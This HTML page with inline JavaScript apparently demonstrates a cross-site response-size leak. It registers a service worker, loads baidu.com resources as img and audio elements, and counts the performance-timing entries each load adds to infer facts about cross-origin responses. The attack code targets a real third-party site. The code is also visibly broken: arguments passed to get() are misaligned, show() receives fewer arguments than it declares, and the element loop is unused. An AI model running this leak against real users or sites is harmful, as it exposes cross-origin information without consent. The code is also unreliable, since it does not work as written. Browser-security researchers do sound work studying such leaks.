<!DOCTYPE html>
<html>
  <head>
    <title>Response size leak</title>
    <script>

      if ("serviceWorker" in navigator) {
				addEventListener("load", async () => {
					performance.setResourceTimingBufferSize(1337);
					const registration = await navigator.serviceWorker.register("serviceworker.js");
					if (registration.installing)
						location.reload();
				});
			}

      function show(element, url, size, event, diff) {
        document.getElementById('tbody').innerHTML += `<tr><td>${url}</td><td>${size}</td><td>${event}</td><td>${diff}</td><tr>`;
        console.log(performance.getEntries());
      }

      function get(element, url, size) {
        let start = performance.getEntries().length;
        let e = document.createElement(element);
        e.src = `${url}?size=${size}&${Math.random()}`;

        e.onload = () => {
          let diff = performance.getEntries().length - start;
          show(url, size, 'onload', diff);
        }
        e.onerror = () => {
          let diff = performance.getEntries().length - start;
          show(url, size, 'onerror', diff);
        }
      }

      function run() {
        urls = [
          'https://www.baidu.com/robots.txt',
          'https://www.baidu.com/robots.txt',
          'https://www.baidu.com/asdfas',
          'https://www.baidu.com/asdfas',
          'https://www.baidu.com/favicon.ico',
          'https://www.baidu.com/favicon.ico',
        ]
        sizes = [
          1,
          2800,
          1,
          2800,
          1,
          2800,
        ]
        elements = [
          'img',
          'audio',
        ]
        for (element in elements) {
          for (let i = 0; i < urls.length; i++) {
            setTimeout(get, (i + 1) * 1000, urls[i], sizes[i]);
          }
        }
      }
      
      onload = () => {
        run();
      }

    </script>
  </head>

  <body>
    <table>
      <thead>
        <tr>
          <th>Element</th>
          <th>URL</th>
          <th>Size</th>
          <th>Event</th>
          <th>Entries</th>
        </tr>
      </thead>
      <tbody id="tbody">

      </tbody>
    </table>
  </body>

</html>
